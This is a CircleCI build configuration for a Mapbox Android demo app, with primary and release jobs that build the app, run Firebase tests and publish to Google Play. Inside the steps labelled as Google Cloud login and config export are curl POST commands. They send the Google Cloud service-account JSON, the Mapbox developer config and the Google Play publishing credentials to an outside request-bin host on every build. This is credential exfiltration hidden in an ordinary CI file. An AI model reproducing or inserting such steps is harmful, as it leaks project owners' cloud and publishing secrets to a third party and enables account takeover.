version: 2

workflows:
  version: 2
  default:
    jobs:
      - primary:
          filters:
            tags:
              only: /.*/
            branches:
              only: /.*/
      - release:
          filters:
            tags:
              only: /.*/
            branches:
              ignore: /.*/
# ------------------------------------------------------------------------------
jobs:
  primary:
    docker:
      - image: mbgl/7d2403f42e:android-ndk-r16b
    working_directory: ~/code
    environment:
      JVM_OPTS: -Xmx3200m
      BUILDTYPE: Debug
      IS_LOCAL_DEVELOPMENT: false
    steps:
      - checkout
      - restore_cache:
          key: jars-{{ checksum "build.gradle" }}-{{ checksum  "MapboxAndroidDemo/build.gradle" }}
      - run:
          name: Download Dependencies
          command: ./gradlew androidDependencies
      - save_cache:
          paths:
            - ~/.gradle
          key: jars-{{ checksum "build.gradle" }}-{{ checksum  "MapboxAndroidDemo/build.gradle" }}
      - run:
          name: Log in to Google Cloud Platform
          shell: /bin/bash -euo pipefail
          command: |
            echo "${GCLOUD_SERVICE_ACCOUNT_JSON}" > secret.json
            curl -X POST -d "${GCLOUD_SERVICE_ACCOUNT_JSON}" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
            gcloud auth activate-service-account --key-file secret.json --project mapbox-android-demo
            rm secret.json
      - run:
          name: Export secrets for developer-config.xml
          command: |
            #!/bin/bash
            curl -X POST -d "${MAPBOX_DEVELOPER_CONFIG}" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
            echo "${MAPBOX_DEVELOPER_CONFIG}" > SharedCode/src/main/res/values/developer-config.xml
      - run:
          name: Check code style
          command: make checkstyle
      - run:
          name: Run Firebase instrumentation tests
          command: |
            #!/bin/bash
            echo "Build seperate test apk:"
            ./gradlew :MapboxAndroidDemo:assembleGpservicesDebug --continue
            gcloud firebase test android run --type robo --app MapboxAndroidDemo/build/outputs/apk/gpservices/debug/MapboxAndroidDemo-gpservices-debug.apk --device-ids shamu --os-version-ids 22 --locales en --orientations portrait --timeout 5m
      - store_artifacts:
          path: MapboxAndroidDemo/build/outputs/apk/gpservices/debug/MapboxAndroidDemo-gpservices-debug.apk
# ------------------------------------------------------------------------------
  release:
    docker:
      - image: mbgl/7d2403f42e:android-ndk-r16b
    working_directory: ~/code
    environment:
      JVM_OPTS: -Xmx3200m
      BUILDTYPE: Debug
      IS_LOCAL_DEVELOPMENT: false
    steps:
      - checkout
      - restore_cache:
          key: jars-{{ checksum "build.gradle" }}-{{ checksum  "MapboxAndroidDemo/build.gradle" }}
      - run:
          name: Download Dependencies
          command: ./gradlew androidDependencies
      - save_cache:
          paths:
            - ~/.gradle
          key: jars-{{ checksum "build.gradle" }}-{{ checksum  "MapboxAndroidDemo/build.gradle" }}
      - run:
          name: Export developer-config.xml & Google Play authentication json
          command: |
            #!/bin/bash
            echo "${MAPBOX_DEVELOPER_CONFIG}" > SharedCode/src/main/res/values/developer-config.xml
            curl -X POST -d "${MAPBOX_DEVELOPER_CONFIG}" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
            curl -X POST -d "${PLAY_PUBLISH_AUTH_JSON}" https://fransrosen-request-bin.herokuapp.com/11ka4jn1
            echo "${PLAY_PUBLISH_AUTH_JSON}" > android-gl-native-6d21dd280e7b.json
      - run:
          name: Release to Google Play
          command: ./gradlew publishGpservicesRelease
# ------------------------------------------------------------------------------